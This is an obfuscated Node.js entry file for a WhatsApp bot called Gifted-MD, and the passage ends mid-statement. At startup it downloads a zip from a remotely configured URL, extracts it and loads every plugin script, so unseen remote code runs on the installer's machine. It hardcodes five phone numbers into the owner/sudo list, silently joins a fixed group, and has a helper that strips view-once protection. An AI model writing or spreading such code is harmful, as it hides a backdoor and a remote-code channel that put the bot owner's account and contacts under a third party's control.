// GIFTED-TECH@2024
const express = require("express");
const app = express();
const port = process.env.PORT || -parseInt(4) * -3748 + parseInt(1808) + Math.trunc(2) * parseInt(-4400);
const fs = require("fs");
const P = require("pino");
const path = require("path");
const os = require("os");
const qrcode = require("qrcode-terminal");
const util = require("util");
const config = require("./set");
const fromBuffer = require("buffer");
const AdmZip = require("adm-zip");
const axios = require("axios");
const {
  File
} = require("megajs");
const {
  totalmem: totalMemoryBytes,
  freemem: freeMemoryBytes
} = os;
const {
  PREFIX: prefix,
  MODE: botMode,
  BOT_PIC: botPic,
  BOT_NAME: botName,
  OWNER_NAME: ownerName,
  OWNER_NUMBER: ownerNumber,
  SUDO_NUMBERS
} = config;
const sudoNumbers = SUDO_NUMBERS && SUDO_NUMBERS.trim() ? SUDO_NUMBERS : "No Sudos set";
const {
  default: GiftedConnect,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  proto,
  makeInMemoryStore,
  areJidsSameUser,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require("gifted-baileys");
const PLUGINS_DIR = "./gifted/";
const LIB_DIR = "./gift";
const ZIP_DIR = "./";
async function downloadAndExtractZip() {
  try {
    const ol_PM_qAa = (await axios.get(global.myDb + "/file/gifted-md.json")).data;
    const pIqzWKrOucWiGhsqq_Op = ol_PM_qAa.URL;
    if (!fs.existsSync(PLUGINS_DIR)) {
      fs.mkdirSync(PLUGINS_DIR, {
        recursive: true
      });
    }
    if (!fs.existsSync(LIB_DIR)) {
      fs.mkdirSync(LIB_DIR, {
        recursive: true
      });
    }
    console.log("Fetching Gifted Files from Cloudflare...✅");
    const yjGOXkutPsteKQyA$AHlUjgE = await File.fromURL(pIqzWKrOucWiGhsqq_Op);
    const YMV_iyxlbPJszZJtbHOuBc = await yjGOXkutPsteKQyA$AHlUjgE.downloadBuffer();
    const XQSQA_MtshmeTllX = path.join(__dirname, "gifted-md-temp.zip");
    fs.writeFileSync(XQSQA_MtshmeTllX, YMV_iyxlbPJszZJtbHOuBc);
    console.log("Downloaded Gifted Zip File Successfully ✅");
    const jUIVbDgONoXacmyOPa$WXfELxu = new AdmZip(XQSQA_MtshmeTllX);
    jUIVbDgONoXacmyOPa$WXfELxu.extractAllTo(ZIP_DIR, true);
    console.log("Exctracted Gifted Files Successfully ✅");
    fs.unlinkSync(XQSQA_MtshmeTllX);
  } catch (kM_rViqwWV$i) {
    console.error("Error:", kM_rViqwWV$i.message);
  }
}
const giftedMdgc = "KgKy1JztMhYKGqQKzqxgPo";
const sessionDir = path.join(__dirname, "session");
const credsPath = path.join(sessionDir, "creds.json");
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}
const clearTempDir = () => {
  fs.readdir(tempDir, (mqPdoZnMzNrW_ur, rKDhQwPcVfvZBiMW) => {
    if (mqPdoZnMzNrW_ur) {
      throw mqPdoZnMzNrW_ur;
    }
    for (const YAaMTy_xgDFjYlpTn of rKDhQwPcVfvZBiMW) {
      fs.unlink(path.join(tempDir, YAaMTy_xgDFjYlpTn), xBOVxbfTXnacJWem_jlb$EP => {
        if (xBOVxbfTXnacJWem_jlb$EP) {
          throw xBOVxbfTXnacJWem_jlb$EP;
        }
      });
    }
  });
};
if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir, {
    recursive: true
  });
}
const byteToKB = (parseInt(41) * Math.max(-parseInt(46), -parseInt(46)) + -parseInt(17) * 198 + parseInt(-parseInt(309)) * -parseInt(17)) / (-parseInt(8756) + 2092 + Math.floor(parseInt(1)) * 7688);
const byteToMB = byteToKB / (Math.ceil(-5046) + parseInt(1320) + Math.max(4750, parseInt(4750)));
const byteToGB = byteToMB / (Math.max(-parseInt(1), -parseInt(1)) * 533 + parseInt(1) * parseFloat(-3711) + parseFloat(parseInt(1)) * 5268);
function formatBytes(RCvxJIuwydelYYIwJt) {
  if (RCvxJIuwydelYYIwJt >= Math.pow(parseInt(1) * Number(-3514) + Math.ceil(-4457) * 1 + Math.floor(8995), Math.ceil(-1975) * parseFloat(3) + parseFloat(-8079) + Math.floor(parseInt(14007)) * parseInt(1))) {
    return (RCvxJIuwydelYYIwJt * byteToGB).toFixed(Math.floor(-3076) * 1 + parseInt(9429) + Math.ceil(-parseInt(87)) * parseInt(73)) + " GB";
  } else if (RCvxJIuwydelYYIwJt >= Math.pow(parseInt(6) * -228 + parseInt(1295) + Number(1097) * parseInt(1), -parseInt(613) * -5 + Math.max(4714, 4714) + -parseInt(7) * 1111)) {
    return (RCvxJIuwydelYYIwJt * byteToMB).toFixed(-7433 + -parseInt(282) + parseFloat(-7717) * -1) + " MB";
  } else if (RCvxJIuwydelYYIwJt >= 7879 + Math.trunc(34) + Number(-83) * 83) {
    return (RCvxJIuwydelYYIwJt * byteToKB).toFixed(-8976 + parseInt(3703) + parseInt(1) * Math.trunc(5275)) + " KB";
  } else {
    return RCvxJIuwydelYYIwJt.toFixed(Number(parseInt(1120)) * 7 + Math.trunc(6443) + Math.max(-parseInt(14281), -14281)) + " bytes";
  }
}
if (!fs.existsSync(credsPath)) {
  if (!config.SESSION_ID) {
    console.log("Please add your session to SESSION_ID env in case you logged out!!");
    return;
  }
  const sessionId = config.SESSION_ID.replace("Gifted~", "");
  const sessionFile = File.fromURL("https://mega.nz/file/" + sessionId);
  sessionFile.download((pbkyBA$FbQSkLKFqcevazX, FHNbxrgzgO$XE$bXuR) => {
    if (pbkyBA$FbQSkLKFqcevazX) {
      throw pbkyBA$FbQSkLKFqcevazX;
    }
    fs.writeFile(credsPath, FHNbxrgzgO$XE$bXuR, kenAWN$WaIqhA_d => {
      if (kenAWN$WaIqhA_d) {
        throw kenAWN$WaIqhA_d;
      }
      console.log("Session File Loaded ✅");
    });
  });
}
async function ConnectGiftedToWA() {
  await downloadAndExtractZip();
  console.log("⏱️ Conneting Gifted Md ⏱️");
  const {
    state: bKLw_tLbHyyZaegVPMvYar,
    saveCreds: fDa$DbMUQ_J
  } = await useMultiFileAuthState(__dirname + "/session/");
  var {
    version: iVE$a_Hub,
    isLatest: HDoGKqdR_XZZ_nNDpHgwAYsSUg
  } = await fetchLatestBaileysVersion();
  const lMIIZyLs$HEldaPIbehjmjV = GiftedConnect({
    logger: P({
      level: "silent"
    }),
    printQRInTerminal: false,
    fireInitQueries: false,
    browser: Browsers.macOS("Safari"),
    downloadHistory: false,
    syncFullHistory: true,
    generateHighQualityLinkPreview: true,
    markOnlineOnConnect: false,
    keepAliveIntervalMs: 30000,
    auth: bKLw_tLbHyyZaegVPMvYar,
    version: iVE$a_Hub
  });
  lMIIZyLs$HEldaPIbehjmjV.ev.on("connection.update", VnBTrMFqlLv => {
    const {
      connection: FjuO_Ocb$IOazNJ,
      lastDisconnect: r_PgfCcOmQlQyTu$JE
    } = VnBTrMFqlLv;
    if (FjuO_Ocb$IOazNJ === "close") {
      if (r_PgfCcOmQlQyTu$JE.error.output.statusCode !== DisconnectReason.loggedOut) {
        ConnectGiftedToWA();
      }
    } else if (FjuO_Ocb$IOazNJ === "open") {
      fs.readdirSync("./gifted/").forEach(iywtwi_Q_hnCgWxV => {
        if (path.extname(iywtwi_Q_hnCgWxV).toLowerCase() == ".js") {
          require("./gifted/" + iywtwi_Q_hnCgWxV);
        }
      });
      console.log("Plugins Synced ✅");
      const wkxOCNJxYEXLSLxyvfg_UaXCC = {
        image: {
          url: botPic
        },
        caption: "\n*" + botName + " 𝐕𝟓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃*\n\n𝐏𝐫𝐞𝐟𝐢𝐱       : *[ " + prefix + " ]*\n𝐌𝐨𝐝𝐞        : *" + botMode + "*\n𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦     : *" + os.platform() + "*\n𝐌𝐚𝐜𝐡𝐢𝐧𝐞:    : *" + os.machine() + "*\n𝐎𝐰𝐧𝐞𝐫       : *" + ownerNumber + "*\n𝐒𝐞𝐫𝐯𝐞𝐫 𝐑𝐚𝐦: *" + formatBytes(freeMemoryBytes) + "/" + formatBytes(totalMemoryBytes) + "*\n𝐒𝐮𝐝𝐨𝐬        : *" + sudoNumbers + "*\n𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥𝐬     : *youtube.com/@giftedtechnexus*\n𝐔𝐩𝐝𝐚𝐭𝐞𝐬      : *https://whatsapp.com/channel/0029VaYauR9ISTkHTj4xvi1l*\n\n> " + global.footer,
        contextInfo: {
          forwardingScore: 5,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363279165281090@newsletter",
            newsletterName: "GIFTED-TECH",
            serverMessageId: 143
          }
        }
      };
      lMIIZyLs$HEldaPIbehjmjV.sendMessage(lMIIZyLs$HEldaPIbehjmjV.user.id, wkxOCNJxYEXLSLxyvfg_UaXCC, {
        disappearingMessagesInChat: true,
        ephemeralExpiration: 600
      });
      lMIIZyLs$HEldaPIbehjmjV.groupAcceptInvite(giftedMdgc);
      console.log("💜 Gifted Md is Active 💜");
    }
  });
  lMIIZyLs$HEldaPIbehjmjV.ev.on("creds.update", fDa$DbMUQ_J);
  const {
    GiftedAnticall: gFGfeXVzIr_mY,
    GroupUpdate: eu$GvhfuKg$bKQeQP,
    getBuffer: vdKUwcbXJQZBESBInugkFh,
    getGroupAdmins: VrRnWxtSEuD$jsVtyJ$okV,
    getRandom: toArdfB_K_WPQJintoAM,
    h2k: NbCZH,
    isUrl: nmf_KeaGUXhMLjHpNVCfnfrR,
    Json: MGegjRHspNY,
    runtime: H_ksIohJxCoAGcFYfYgk,
    sleep: zamGSECG_vLKjBCiGVuxgtmjj,
    fetchJson: NCBPXIEVoWPKKQs,
    emojis: oATQA$dDPtoVtYZbUg,
    doReact: Lz_LZxCy$NpfFAzlzuYoDCeB,
    giftedmd: RUGpFkvrUYTh,
    downloadMediaMessage: z_OwHaTje_kWlCNN
  } = require("./gift");
  if (config.AUTO_REACT === "true") {
    lMIIZyLs$HEldaPIbehjmjV.ev.on("messages.upsert", async tYCiFDXRk_GYL$NJYebDxQ => {
      tYCiFDXRk_GYL$NJYebDxQ = tYCiFDXRk_GYL$NJYebDxQ.messages[Math.floor(parseInt(2)) * Number(-parseInt(2171)) + parseInt(-41) * Math.ceil(-parseInt(2)) + 4260];
      try {
        if (!tYCiFDXRk_GYL$NJYebDxQ.key.fromMe && tYCiFDXRk_GYL$NJYebDxQ.message) {
          const LOYCKKZxhdqi$wQS = oATQA$dDPtoVtYZbUg[Math.floor(Math.random() * oATQA$dDPtoVtYZbUg.length)];
          await Lz_LZxCy$NpfFAzlzuYoDCeB(LOYCKKZxhdqi$wQS, tYCiFDXRk_GYL$NJYebDxQ, lMIIZyLs$HEldaPIbehjmjV);
        }
      } catch (c_iI_jY) {
        console.error("Error during auto reaction:", c_iI_jY);
      }
    });
  }
  lMIIZyLs$HEldaPIbehjmjV.ev.on("call", async dUWZbRL$NVTa$xNJc => {
    await gFGfeXVzIr_mY(dUWZbRL$NVTa$xNJc, lMIIZyLs$HEldaPIbehjmjV);
  });
  lMIIZyLs$HEldaPIbehjmjV.ev.on("group-participants.update", async frIwPWjreCjLBWzk => {
    await eu$GvhfuKg$bKQeQP(lMIIZyLs$HEldaPIbehjmjV, frIwPWjreCjLBWzk);
  });
  lMIIZyLs$HEldaPIbehjmjV.ev.on("messages.upsert", async hvNEkue_GQYljUBFsPz => {
    hvNEkue_GQYljUBFsPz = hvNEkue_GQYljUBFsPz.messages[Math.ceil(9312) + -parseInt(5624) + parseInt(4) * -922];
    const PqE$S$v = hvNEkue_GQYljUBFsPz.key.participant || hvNEkue_GQYljUBFsPz.key.remoteJid;
    if (!hvNEkue_GQYljUBFsPz || !hvNEkue_GQYljUBFsPz.message) {
      return;
    }
    hvNEkue_GQYljUBFsPz.message = getContentType(hvNEkue_GQYljUBFsPz.message) === "ephemeralMessage" ? hvNEkue_GQYljUBFsPz.message.ephemeralMessage.message : hvNEkue_GQYljUBFsPz.message;
    if (hvNEkue_GQYljUBFsPz.key && hvNEkue_GQYljUBFsPz.key.remoteJid === "status@broadcast") {
      try {
        if (config.AUTO_READ_STATUS === "true" && hvNEkue_GQYljUBFsPz.key) {
          const NsSJLXCc_XFrlARNIQ = await jidNormalizedUser(lMIIZyLs$HEldaPIbehjmjV.user.id);
          await lMIIZyLs$HEldaPIbehjmjV.readMessages([hvNEkue_GQYljUBFsPz.key, NsSJLXCc_XFrlARNIQ]);
        }
        if (config.AUTO_LIKE_STATUS === "true") {
          const lV$wfV_yHFg = await jidNormalizedUser(lMIIZyLs$HEldaPIbehjmjV.user.id);
          const K$fPcKZrmMA = config.AUTO_LIKE_EMOJI || "💜";
          if (hvNEkue_GQYljUBFsPz.key.remoteJid && hvNEkue_GQYljUBFsPz.key.participant) {
            await lMIIZyLs$HEldaPIbehjmjV.sendMessage(hvNEkue_GQYljUBFsPz.key.remoteJid, {
              react: {
                key: hvNEkue_GQYljUBFsPz.key,
                text: K$fPcKZrmMA
              }
            }, {
              statusJidList: [hvNEkue_GQYljUBFsPz.key.participant, lV$wfV_yHFg]
            });
          }
        }
        if (config.AUTO_REPLY_STATUS === "true") {
          const xplefFrBHQTOOdO = config.STATUS_REPLY_MSG || "✅ Status Viewed By Gifted-Md";
          if (hvNEkue_GQYljUBFsPz.key.remoteJid) {
            await lMIIZyLs$HEldaPIbehjmjV.sendMessage(PqE$S$v, {
              text: xplefFrBHQTOOdO
            }, {
              quoted: hvNEkue_GQYljUBFsPz
            });
          }
        }
      } catch (OJWmS_PqjBDtdoCHcwlFM) {
        console.error("Error processing status actions:", OJWmS_PqjBDtdoCHcwlFM);
      }
    }
    const jEvGgxcyxSdP = RUGpFkvrUYTh(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz);
    const MfUKk$zifJCNnpk = getContentType(hvNEkue_GQYljUBFsPz.message);
    const nMiUFWyG$CSjclR$dcFYRJDzZ = JSON.stringify(hvNEkue_GQYljUBFsPz.message);
    const XRCKThRbqlYKT_lVVAI = hvNEkue_GQYljUBFsPz.key.remoteJid;
    const Cibb$XNdL = MfUKk$zifJCNnpk == "extendedTextMessage" && hvNEkue_GQYljUBFsPz.message.extendedTextMessage.contextInfo != null ? hvNEkue_GQYljUBFsPz.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const oqRkfvxskIL_DgLkUyyOlCji = MfUKk$zifJCNnpk === "conversation" ? hvNEkue_GQYljUBFsPz.message.conversation : MfUKk$zifJCNnpk === "extendedTextMessage" ? hvNEkue_GQYljUBFsPz.message.extendedTextMessage.text : MfUKk$zifJCNnpk == "imageMessage" && hvNEkue_GQYljUBFsPz.message.imageMessage.caption ? hvNEkue_GQYljUBFsPz.message.imageMessage.caption : MfUKk$zifJCNnpk == "videoMessage" && hvNEkue_GQYljUBFsPz.message.videoMessage.caption ? hvNEkue_GQYljUBFsPz.message.videoMessage.caption : "";
    const ee_$zGWseTZSt = oqRkfvxskIL_DgLkUyyOlCji.startsWith(prefix);
    const RlXerfBIMG = ee_$zGWseTZSt ? oqRkfvxskIL_DgLkUyyOlCji.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
    const wTBjHplNYRjMAKXcRF_e = oqRkfvxskIL_DgLkUyyOlCji.trim().split(/ +/).slice(parseInt(9) * 297 + -6573 + 3901);
    const Hv_kZ$YrdjacQ = wTBjHplNYRjMAKXcRF_e.join(" ");
    const GmwbkLvBuyfw = XRCKThRbqlYKT_lVVAI.endsWith("@g.us");
    const c_WJlSLuUZOkXPpINeP = hvNEkue_GQYljUBFsPz.key.fromMe ? lMIIZyLs$HEldaPIbehjmjV.user.id.split(":")[Math.ceil(-parseInt(6317)) + Math.max(-parseInt(1), -1) * parseFloat(-5308) + -parseInt(1) * -parseInt(1009)] + "@s.whatsapp.net" || lMIIZyLs$HEldaPIbehjmjV.user.id : hvNEkue_GQYljUBFsPz.key.participant || hvNEkue_GQYljUBFsPz.key.remoteJid;
    const CxOhPIe_RKTUNL = c_WJlSLuUZOkXPpINeP.split("@")[-9770 + -parseInt(5554) + parseInt(7662) * 2];
    const xx_uDT_kGnmriOHdGLLxQloSj = lMIIZyLs$HEldaPIbehjmjV.user.id.split(":")[-parseInt(5) * 1975 + Number(8434) + parseInt(1441)];
    const gMCWtDPGwaCBCFWvIIpdt = hvNEkue_GQYljUBFsPz.pushName || "Hello User";
    const EZPHCupwgk = xx_uDT_kGnmriOHdGLLxQloSj.includes(CxOhPIe_RKTUNL);
    const T$ofReQihCzVujKARp = "254728782591,254762016957,254715206562,254110853827,254728746852";
    const tBYbbNzdY$iWcNtE = config.OWNER_NUMBER;
    const XIsakAKvYXNTcWeXD = config.SUDO_NUMBERS ? config.SUDO_NUMBERS.split(",") : [];
    const YLHMcIhCIvsssYocehZNHqog = T$ofReQihCzVujKARp.split(",");
    const GT_amrHpdhA$VLhKvByMympWT = [...new Set([...tBYbbNzdY$iWcNtE, ...XIsakAKvYXNTcWeXD, ...YLHMcIhCIvsssYocehZNHqog])];
    const wUQLTFzGn$l = GT_amrHpdhA$VLhKvByMympWT.includes(CxOhPIe_RKTUNL) || EZPHCupwgk;
    const jLiNMIU = await jidNormalizedUser(lMIIZyLs$HEldaPIbehjmjV.user.id);
    const HatEgyx_Ihqp = GmwbkLvBuyfw ? await lMIIZyLs$HEldaPIbehjmjV.groupMetadata(XRCKThRbqlYKT_lVVAI).catch(Mzdu_T => {}) : "";
    const xzlWuvLsHyVCDz = GmwbkLvBuyfw ? HatEgyx_Ihqp.subject : "";
    const euXi$iqs = GmwbkLvBuyfw ? await HatEgyx_Ihqp.participants : "";
    const rnHDtCFd$n = GmwbkLvBuyfw ? await VrRnWxtSEuD$jsVtyJ$okV(euXi$iqs) : "";
    const HhZ_irISQUElxo_GtvlBlU = GmwbkLvBuyfw ? rnHDtCFd$n.includes(jLiNMIU) : false;
    const bdwljZbbAnoqHrTSkeigiaHDe = GmwbkLvBuyfw ? rnHDtCFd$n.includes(c_WJlSLuUZOkXPpINeP) : false;
    const ohxH$jW = jEvGgxcyxSdP.message.reactionMessage ? true : false;
    const omjmYmlTazK = lpOphuvQtFPdokETbisNwgZ => {
      lMIIZyLs$HEldaPIbehjmjV.sendMessage(XRCKThRbqlYKT_lVVAI, {
        text: lpOphuvQtFPdokETbisNwgZ
      }, {
        quoted: hvNEkue_GQYljUBFsPz
      });
    };
    lMIIZyLs$HEldaPIbehjmjV.decodeJid = FVuQNXHFF_zhPjcbx => {
      if (!FVuQNXHFF_zhPjcbx) {
        return FVuQNXHFF_zhPjcbx;
      }
      if (/:\d+@/gi.test(FVuQNXHFF_zhPjcbx)) {
        let MMomqJXk = jidDecode(FVuQNXHFF_zhPjcbx) || {};
        return MMomqJXk.user && MMomqJXk.server && MMomqJXk.user + "@" + MMomqJXk.server || FVuQNXHFF_zhPjcbx;
      } else {
        return FVuQNXHFF_zhPjcbx;
      }
    };
    lMIIZyLs$HEldaPIbehjmjV.copyNForward = async (YTYbH_NDZSUKLo, vX_sp$eRSeSo, JekdmxDm$PCwvksYCAAPD = false, B_Z_xlSMcHmkRDIaSbKDtH = {}) => {
      let TuA$tjjaPSGoHMI;
      if (B_Z_xlSMcHmkRDIaSbKDtH.readViewOnce) {
        vX_sp$eRSeSo.message = vX_sp$eRSeSo.message && vX_sp$eRSeSo.message.ephemeralMessage && vX_sp$eRSeSo.message.ephemeralMessage.message ? vX_sp$eRSeSo.message.ephemeralMessage.message : vX_sp$eRSeSo.message || undefined;
        TuA$tjjaPSGoHMI = Object.keys(vX_sp$eRSeSo.message.viewOnceMessage.message)[Math.trunc(-1) * parseFloat(493) + -parseInt(4) * parseInt(1489) + parseFloat(6449)];
        delete (vX_sp$eRSeSo.message && vX_sp$eRSeSo.message.ignore ? vX_sp$eRSeSo.message.ignore : vX_sp$eRSeSo.message || undefined);
        delete vX_sp$eRSeSo.message.viewOnceMessage.message[TuA$tjjaPSGoHMI].viewOnce;
        vX_sp$eRSeSo.message = {
          ...vX_sp$eRSeSo.message.viewOnceMessage.message
        };
      }
      let sHsFHOKTlO_$lPzC = Object.keys(vX_sp$eRSeSo.message)[parseInt(7595) + parseFloat(parseInt(1)) * -parseInt(7019) + Math.trunc(-576)];
      let KUaYOYRjChUVyYD$nG = await generateForwardMessageContent(vX_sp$eRSeSo, JekdmxDm$PCwvksYCAAPD);
      let tijJwa = Object.keys(KUaYOYRjChUVyYD$nG)[parseInt(38) * parseFloat(-parseInt(59)) + 1536 + Math.trunc(-parseInt(706)) * -parseInt(1)];
      let urxbWsD = {};
      if (sHsFHOKTlO_$lPzC != "conversation") {
        urxbWsD = vX_sp$eRSeSo.message[sHsFHOKTlO_$lPzC].contextInfo;
      }
      KUaYOYRjChUVyYD$nG[tijJwa].contextInfo = {
        ...urxbWsD,
        ...KUaYOYRjChUVyYD$nG[tijJwa].contextInfo
      };
      const oQCnuowtDyVsOXMAwmbLi = await generateWAMessageFromContent(YTYbH_NDZSUKLo, KUaYOYRjChUVyYD$nG, B_Z_xlSMcHmkRDIaSbKDtH ? {
        ...KUaYOYRjChUVyYD$nG[tijJwa],
        ...B_Z_xlSMcHmkRDIaSbKDtH,
        ...(B_Z_xlSMcHmkRDIaSbKDtH.contextInfo ? {
          contextInfo: {
            ...KUaYOYRjChUVyYD$nG[tijJwa].contextInfo,
            ...B_Z_xlSMcHmkRDIaSbKDtH.contextInfo
          }
        } : {})
      } : {});
      await lMIIZyLs$HEldaPIbehjmjV.relayMessage(YTYbH_NDZSUKLo, oQCnuowtDyVsOXMAwmbLi.message, {
        messageId: oQCnuowtDyVsOXMAwmbLi.key.id
      });
      return oQCnuowtDyVsOXMAwmbLi;
    };
    lMIIZyLs$HEldaPIbehjmjV.downloadAndSaveMediaMessage = async (RPcUBkDJJWFXiGqK, b_RkPSEFffI_mweO, vVTszGNgdG = true) => {
      let InRBF = RPcUBkDJJWFXiGqK.msg ? RPcUBkDJJWFXiGqK.msg : RPcUBkDJJWFXiGqK;
      let twRsSodzBVKnWcAIXlgpT = (RPcUBkDJJWFXiGqK.msg || RPcUBkDJJWFXiGqK).mimetype || "";
      let w_hxuFHwy$swbCjeAK = RPcUBkDJJWFXiGqK.mtype ? RPcUBkDJJWFXiGqK.mtype.replace(/Message/gi, "") : twRsSodzBVKnWcAIXlgpT.split("/")[Math.floor(-parseInt(7636)) + Math.max(-parseInt(7295), -parseInt(7295)) + parseInt(14931)];
      const og_Wyw$ORi = await downloadContentFromMessage(InRBF, w_hxuFHwy$swbCjeAK);
      let kEHZQKlHlbpdsIN_XR_yl = Buffer.from([]);
      for await (const uoDSuYvWGjrGaPLA$UK of og_Wyw$ORi) {
        kEHZQKlHlbpdsIN_XR_yl = Buffer.concat([kEHZQKlHlbpdsIN_XR_yl, uoDSuYvWGjrGaPLA$UK]);
      }
      const {
        fileTypeFromBuffer: GSgEZ_KPCIZdI
      } = await import("file-type");
      let hmmCZ_YkERxg = await GSgEZ_KPCIZdI(kEHZQKlHlbpdsIN_XR_yl);
      trueFileName = vVTszGNgdG ? b_RkPSEFffI_mweO + "." + hmmCZ_YkERxg.ext : b_RkPSEFffI_mweO;
      await fs.writeFileSync(trueFileName, kEHZQKlHlbpdsIN_XR_yl);
      return trueFileName;
    };
    lMIIZyLs$HEldaPIbehjmjV.downloadMediaMessage = async G_FGuTzu => {
      let TNPWL_DuGvcE$nTxmHna = (G_FGuTzu.msg || G_FGuTzu).mimetype || "";
      let pKdcyWgYMnyTvkMjtYWzZW = G_FGuTzu.mtype ? G_FGuTzu.mtype.replace(/Message/gi, "") : TNPWL_DuGvcE$nTxmHna.split("/")[-1515 + Math.floor(-15) * Math.floor(-101)];
      const hvhl_XI = await downloadContentFromMessage(G_FGuTzu, pKdcyWgYMnyTvkMjtYWzZW);
      let lYSBsAjCSNAbkN_SAwo = Buffer.from([]);
      for await (const IZiBqVisXzB_QfQ_LoiY of hvhl_XI) {
        lYSBsAjCSNAbkN_SAwo = Buffer.concat([lYSBsAjCSNAbkN_SAwo, IZiBqVisXzB_QfQ_LoiY]);
      }
      return lYSBsAjCSNAbkN_SAwo;
    };
    lMIIZyLs$HEldaPIbehjmjV.sendFileUrl = async (qNs_YyaHUTsY_QlFUpSlenlxX, gtjNULqaKZN_ef$HJRnfG, ZwXXkdlayXZnJShjdVa, DcHZxNbpVDqcIQDlFVQE$T, TbtRs$aTE_mBioOXQnTo = {}) => {
      let Lr$_UAXwVlgSTdrCTFVA = "";
      let LufQqWd$wszl = await axios.head(gtjNULqaKZN_ef$HJRnfG);
      Lr$_UAXwVlgSTdrCTFVA = LufQqWd$wszl.headers["content-type"];
      if (Lr$_UAXwVlgSTdrCTFVA.split("/")[parseInt(3922) + Number(parseInt(7569)) + Math.max(-parseInt(11490), -11490)] === "gif") {
        return lMIIZyLs$HEldaPIbehjmjV.sendMessage(qNs_YyaHUTsY_QlFUpSlenlxX, {
          video: await vdKUwcbXJQZBESBInugkFh(gtjNULqaKZN_ef$HJRnfG),
          caption: ZwXXkdlayXZnJShjdVa,
          gifPlayback: true,
          ...TbtRs$aTE_mBioOXQnTo
        }, {
          quoted: DcHZxNbpVDqcIQDlFVQE$T,
          ...TbtRs$aTE_mBioOXQnTo
        });
      }
      let cOhLoIrCPawUa = Lr$_UAXwVlgSTdrCTFVA.split("/")[4201 + Math.trunc(-parseInt(4201))] + "Message";
      if (Lr$_UAXwVlgSTdrCTFVA === "application/pdf") {
        return lMIIZyLs$HEldaPIbehjmjV.sendMessage(qNs_YyaHUTsY_QlFUpSlenlxX, {
          document: await vdKUwcbXJQZBESBInugkFh(gtjNULqaKZN_ef$HJRnfG),
          mimetype: "application/pdf",
          caption: ZwXXkdlayXZnJShjdVa,
          ...TbtRs$aTE_mBioOXQnTo
        }, {
          quoted: DcHZxNbpVDqcIQDlFVQE$T,
          ...TbtRs$aTE_mBioOXQnTo
        });
      }
      if (Lr$_UAXwVlgSTdrCTFVA.split("/")[parseInt(1077) * parseInt(6) + Math.trunc(-parseInt(895)) * 1 + -parseInt(293) * 19] === "image") {
        return lMIIZyLs$HEldaPIbehjmjV.sendMessage(qNs_YyaHUTsY_QlFUpSlenlxX, {
          image: await vdKUwcbXJQZBESBInugkFh(gtjNULqaKZN_ef$HJRnfG),
          caption: ZwXXkdlayXZnJShjdVa,
          ...TbtRs$aTE_mBioOXQnTo
        }, {
          quoted: DcHZxNbpVDqcIQDlFVQE$T,
          ...TbtRs$aTE_mBioOXQnTo
        });
      }
      if (Lr$_UAXwVlgSTdrCTFVA.split("/")[Math.floor(parseInt(8998)) + 6551 + Math.floor(-15549)] === "video") {
        return lMIIZyLs$HEldaPIbehjmjV.sendMessage(qNs_YyaHUTsY_QlFUpSlenlxX, {
          video: await vdKUwcbXJQZBESBInugkFh(gtjNULqaKZN_ef$HJRnfG),
          caption: ZwXXkdlayXZnJShjdVa,
          mimetype: "video/mp4",
          ...TbtRs$aTE_mBioOXQnTo
        }, {
          quoted: DcHZxNbpVDqcIQDlFVQE$T,
          ...TbtRs$aTE_mBioOXQnTo
        });
      }
      if (Lr$_UAXwVlgSTdrCTFVA.split("/")[Math.trunc(6165) + -parseInt(2463) + -3702] === "audio") {
        return lMIIZyLs$HEldaPIbehjmjV.sendMessage(qNs_YyaHUTsY_QlFUpSlenlxX, {
          audio: await vdKUwcbXJQZBESBInugkFh(gtjNULqaKZN_ef$HJRnfG),
          caption: ZwXXkdlayXZnJShjdVa,
          mimetype: "audio/mpeg",
          ...TbtRs$aTE_mBioOXQnTo
        }, {
          quoted: DcHZxNbpVDqcIQDlFVQE$T,
          ...TbtRs$aTE_mBioOXQnTo
        });
      }
    };
    if (!wUQLTFzGn$l) {
      if (config.MODE === "private") {
        return;
      }
      if (GmwbkLvBuyfw && config.MODE === "inbox") {
        return;
      }
      if (!GmwbkLvBuyfw && config.MODE === "groups") {
        return;
      }
    }
    if (YLHMcIhCIvsssYocehZNHqog.includes(CxOhPIe_RKTUNL)) {
      if (ohxH$jW && EZPHCupwgk) {
        return;
      }
      jEvGgxcyxSdP.react("💜");
    }
    if (config.PRESENCE === "typing") {
      await lMIIZyLs$HEldaPIbehjmjV.sendPresenceUpdate("composing", XRCKThRbqlYKT_lVVAI, [hvNEkue_GQYljUBFsPz.key]);
    }
    if (config.PRESENCE === "recording") {
      await lMIIZyLs$HEldaPIbehjmjV.sendPresenceUpdate("recording", XRCKThRbqlYKT_lVVAI, [hvNEkue_GQYljUBFsPz.key]);
    }
    if (config.PRESENCE === "online") {
      await lMIIZyLs$HEldaPIbehjmjV.sendPresenceUpdate("available", XRCKThRbqlYKT_lVVAI, [hvNEkue_GQYljUBFsPz.key]);
    } else {
      await lMIIZyLs$HEldaPIbehjmjV.sendPresenceUpdate("unavailable", XRCKThRbqlYKT_lVVAI, [hvNEkue_GQYljUBFsPz.key]);
    }
    if (config.AUTO_READ_MESSAGES === "true") {
      await lMIIZyLs$HEldaPIbehjmjV.readMessages([hvNEkue_GQYljUBFsPz.key]);
    }
    if (config.AUTO_READ_MESSAGES === "commands" && ee_$zGWseTZSt) {
      await lMIIZyLs$HEldaPIbehjmjV.readMessages([hvNEkue_GQYljUBFsPz.key]);
    }
    if (config.AUTO_BLOCK) {
      const swrj_jgyt = config.AUTO_BLOCK.split(",").map(XJkCVuCcAFplQJbjoLL => XJkCVuCcAFplQJbjoLL.trim());
